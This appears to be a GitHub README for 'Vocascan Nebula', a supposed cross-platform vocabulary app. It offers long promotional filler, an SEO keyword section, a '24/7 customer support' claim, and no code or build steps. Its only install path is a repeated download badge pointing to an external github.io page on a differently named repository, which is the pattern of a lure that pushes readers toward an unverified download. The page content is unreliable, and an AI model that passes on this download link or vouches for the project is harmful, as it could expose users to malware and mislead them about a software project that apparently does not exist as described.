![preview](https://raw.githubusercontent.com/dasha168/vocascan-pocket/main/banner_f125d.svg)
[![Download](https://raw.githubusercontent.com/dasha168/vocascan-pocket/main/go_1be9c.svg)](https://dasha168.github.io/vocascan-pocket/)

# Vocascan Nebula

**The pocket universe for your vocabulary — a next-generation Android and iOS companion for Vocascan.**

Vocascan Nebula is a reimagining of the classic Vocascan mobile client, rebuilt from the ground up as a cross-platform experience that treats language learning like stargazing: every word you learn is a star, every deck a constellation, and every review session a journey across the night sky of your own knowledge. Built for learners, teachers, polyglots, and curious minds in 2026 who want their vocabulary to travel with them.

---

## 🌌 Table of Contents

- [Introduction](#-introduction)
- [Vision & Philosophy](#-vision--philosophy)
- [Feature Highlights](#-feature-highlights)
- [Platform Support](#-platform-support)
- [Architecture Overview](#-architecture-overview)
- [Multilingual Support](#-multilingual-support)
- [Responsive UI & Design Language](#-responsive-ui--design-language)
- [Offline-First Sync Engine](#-offline-first-sync-engine)
- [Accessibility & Inclusion](#-accessibility--inclusion)
- [Customer Support Promise](#-customer-support-promise)
- [Getting the App](#-getting-the-app)
- [Roadmap 2026](#-roadmap-2026)
- [Community & Contribution](#-community--contribution)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Security & Privacy](#-security--privacy)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🚀 Introduction

Language learning should not feel like a chore dictated by streak counters and guilt notifications. Vocascan Nebula approaches vocabulary acquisition as a slow, deliberate act of mapping — you sketch, you annotate, you revisit. The app is a mobile client for the Vocascan ecosystem, designed to sync seamlessly with your self-hosted or hosted Vocascan instance, so your word library belongs to you and travels wherever you do.

Whether you are a student memorizing medical terminology in three languages, a traveler hoarding survival phrases, or a hobbyist collecting rare idioms from endangered tongues, Vocascan Nebula keeps your personal lexicon organized, searchable, and always at hand.

This repository is the home of the Android and iOS client. It is a distinct project inspired by, but not identical to, the original `vocascan-mobile` repository. We rethought everything: navigation, theming, sync, accessibility, and the underlying data model.

---

## 🔭 Vision & Philosophy

We built Vocascan Nebula around three beliefs:

1. **Vocabulary is personal cartography.** Your decks are maps, not checklists.
2. **Repetition should feel rewarding, not punitive.** Spaced repetition is a tool, not a punishment.
3. **Your data lives where you decide.** Self-hosting is a first-class citizen, not an afterthought.

Instead of chaining users to a cloud account, Vocascan Nebula treats your Vocascan server as a home base. You can spin up the client without ever touching a proprietary backend. The app is a lantern you carry into the dark; the server is the library you return to.

---

## ✨ Feature Highlights

- **Adaptive spaced-repetition scheduler** that learns your forgetting curve instead of applying a rigid formula.
- **Deck nesting and tagging** with a hierarchical tree that mirrors how you actually think about topics.
- **Bidirectional review modes** — recognize, recall, type, and listen, all from the same card.
- **Smart grouping by difficulty, recency, and confidence.**
- **Cross-platform consistency** between Android and iOS with pixel-respectful adaptations.
- **Full offline operation** with conflict-free merge when you reconnect.
- **Theme engine** with light, dark, sepia, high-contrast, and seasonal palettes.
- **Text-to-speech playback** across dozens of locales using platform engines.
- **Custom card templates** supporting rich text, inline pronunciation, and synonyms.
- **Statistics dashboard** visualizing your learning journey across weeks, months, and years.
- **Import and export** for CSV, TSV, JSON, and a lightweight portable deck format.
- **Account-less local mode** for users who want to test drive everything without setting up a server.
- **Widgets and quick-review tiles** on both platforms.
- **Focus mode** that hides all counters and notifications so you can just study.
- **Keyboard-first navigation** for tablets, foldables, and desktop-class input.

Every feature is designed so that a newcomer can be productive within minutes, while a power user can shape the app to their exact mental model.

---

## 📱 Platform Support

| Platform | Minimum Version | Notes |
|----------|-----------------|-------|
| Android | 8.0 Oreo (API 26) | Full feature set including widgets |
| iOS | 15.0 | Full feature set with native share extensions |
| iPadOS | 15.0 | Enhanced multi-column layout |
| Android Tablets | API 26 | Adaptive two-pane navigation |

We deliberately chose conservative minimum versions so that a wide range of devices — including older, budget, and refurbished hardware — can participate in the Vocascan Nebula experience. Language learning should not require the latest flagship phone.

---

## 🏗️ Architecture Overview

Vocascan Nebula is structured for longevity and testability.

- **Presentation layer** built with a declarative, component-driven UI model that abstracts platform widgets.
- **Domain layer** containing pure business logic, schedulers, and review algorithms with no platform dependencies.
- **Data layer** splitting local persistence from remote synchronization through a repository facade.
- **Sync engine** using an operation log with vector-clock-inspired conflict resolution.
- **Design system package** centralizing typography, spacing, color, motion, and accessibility tokens.
- **Localization pipeline** generating typed translation keys at build time to prevent missing strings.
- **Testing pyramid** covering pure logic with unit tests, repository behavior with integration tests, and UI flows with end-to-end scenarios.

This separation means you can swap the storage backend, adopt a new sync transport, or redesign the interface without rewriting your vocabulary logic.

---

## 🌍 Multilingual Support

Vocascan Nebula speaks your language — literally. The interface ships with translations for:

- English
- German
- Spanish
- French
- Italian
- Portuguese (European and Brazilian)
- Dutch
- Polish
- Czech
- Turkish
- Japanese
- Korean
- Simplified and Traditional Chinese
- Arabic (with full right-to-left layout support)
- Hebrew (with full right-to-left layout support)
- Hindi
- Russian
- Ukrainian

Beyond the interface, the app supports learning *between* any of these languages. You can define source and target languages per deck, mix them within a session, and let the review engine adapt pronunciation hints and text direction on the fly.

Community translations are welcomed through a structured localization workflow. Every string is versioned, every contributor credited.

---

## 🎨 Responsive UI & Design Language

The design language of Vocascan Nebula is called **"Lantern."** It prioritizes legibility, calm motion, and generous touch targets.

- **Adaptive layouts** that shift from single-column phone views to spacious multi-pane tablet experiences.
- **Dynamic type** that respects system accessibility font scaling without breaking composition.
- **Motion with purpose** — transitions explain where you came from and where you are going.
- **Color tokens** defined semantically, so themes can be swapped without hunting for hard-coded values.
- **Card surfaces** that render consistently across platforms yet feel native on each.
- **Gesture vocabulary** that stays predictable: swipe to reveal, long-press to edit, drag to reorder.

The goal is a responsive interface that feels at home whether you are tapping on a crowded bus or reviewing on a large tablet with a keyboard.

---

## 📡 Offline-First Sync Engine

Networks fail. Subways lose signal. Airplanes turn off connectivity. Vocascan Nebula assumes the worst and works anyway.

- **Every action is queued locally** and replayed when a connection returns.
- **Conflicts are resolved** using a last-writer-aware merge that preserves both edits where possible.
- **Partial syncs** let you pull only the decks you need on constrained connections.
- **Background refresh** keeps your word library current without draining the battery.
- **Detailed sync log** shows exactly what changed and when, so you are never confused about the state of your data.

The sync engine is transport-agnostic. Today it speaks the Vocascan REST protocol; tomorrow it could speak gRPC or a peer-to-peer channel without changing the app's behavior.

---

## ♿ Accessibility & Inclusion

Accessibility is not a checkbox; it is a design constraint applied from the first wireframe.

- Full screen reader support on Android TalkBack and iOS VoiceOver.
- Semantic labels for every interactive control.
- Minimum contrast ratios verified in every official theme.
- Reduced motion mode that respects system preferences.
- Haptic feedback as a non-visual confirmation channel.
- Keyboard and switch-control navigation on supported devices.

If a feature cannot be used by everyone, it is not finished.

---

## 🕰️ Customer Support Promise

We treat support as a promise, not a perk.

- **24/7 customer support** through in-app feedback channels and community forums.
- **Average first response under twelve hours** for reproducible issues.
- **Public issue tracker** where roadmap discussions happen in the open.
- **Migration assistance** for users moving from older Vocascan clients.
- **Documentation-first answers** so knowledge stays searchable rather than trapped in private threads.

You will never be left alone with a broken sync or an empty deck.

---

## 📥 Getting the App

To obtain Vocascan Nebula, use the distribution channel that matches your device and preference. The download entry point is provided below.

[![Download](https://raw.githubusercontent.com/dasha168/vocascan-pocket/main/go_1be9c.svg)](https://dasha168.github.io/vocascan-pocket/)

Once you have the app installed, point it at your Vocascan server or begin in local-only mode. No account is required to explore, and no proprietary gatekeeper stands between you and your word library.

---

## 🗺️ Roadmap 2026

Our published intentions for the year:

- **Q1 2026** — Stabilization of the sync engine, expanded widget support, and public beta of the deck marketplace integration.
- **Q2 2026** — Collaborative decks with shared editing and comment threads.
- **Q3 2026** — On-device language model hints for generating example sentences and mnemonics, processed entirely locally.
- **Q4 2026** — Full desktop-class companion experience and deeper offline analytics.

Roadmap items are discussed openly in the issue tracker. Priorities shift based on what the community actually needs.

---

## 🤝 Community & Contribution

Contributions of all sizes are welcome: translations, bug reports, design proposals, documentation improvements, and code.

- Read the contribution guidelines before opening a pull request.
- Follow the code of conduct in every interaction.
- Sign off your commits where required by the project's provenance rules.
- Prefer small, focused changes over sweeping rewrites.
- Add tests for behavior changes, and update documentation for user-facing changes.

If you are unsure where to start, look for issues labeled as good-first-task. Maintainers triage regularly and are happy to mentor newcomers.

---

## 🔎 SEO & Discoverability Notes

This section exists for contributors who want to understand how the project presents itself.

- Vocascan Nebula is a mobile vocabulary trainer for Android and iOS.
- It is a cross-platform language learning client with offline-first sync.
- It supports multilingual flashcards, spaced repetition, and self-hosted servers.
- It is an open-source vocabulary app suitable for students, teachers, and polyglots.
- It offers a responsive user interface, accessibility-first design, and 24/7 customer support.

Documentation uses these phrases naturally because they describe what the project actually does. We avoid keyword stuffing; clarity beats density.

---

## 🔒 Security & Privacy

- No analytics SDKs ship with the app.
- No telemetry is collected without explicit opt-in.
- All network communication uses TLS and can be pinned to your own certificate.
- Credentials are stored in platform keystores.
- Server URLs, deck contents, and review history never leave your device unless you configure a sync target.

If you discover a security concern, report it privately through the channels listed in the security policy. Responsible disclosure is appreciated and credited.

---

## ⚠️ Disclaimer

Vocascan Nebula is provided as-is, without warranty of any kind, express or implied. The maintainers are not liable for any loss of data, missed study sessions, or unexpected heartbreak caused by a corrupted deck. Vocabulary retention depends on many factors; the app is a tool, not a guarantee. Always keep backups of important decks, and test sync behavior before relying on it for irreplaceable material. References to third-party services, servers, or platforms do not imply endorsement. Use of the app is at your own discretion and in compliance with the laws of your jurisdiction.

---

## 📜 License

This project is released under the MIT License. See the full text at the link below.

[MIT License](LICENSE)

Copyright (c) 2026 Vocascan Nebula contributors.

Permission is hereby granted, without charge, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies, subject to the conditions of the MIT License. The software is provided without warranty, and the authors are not liable for any claims arising from its use.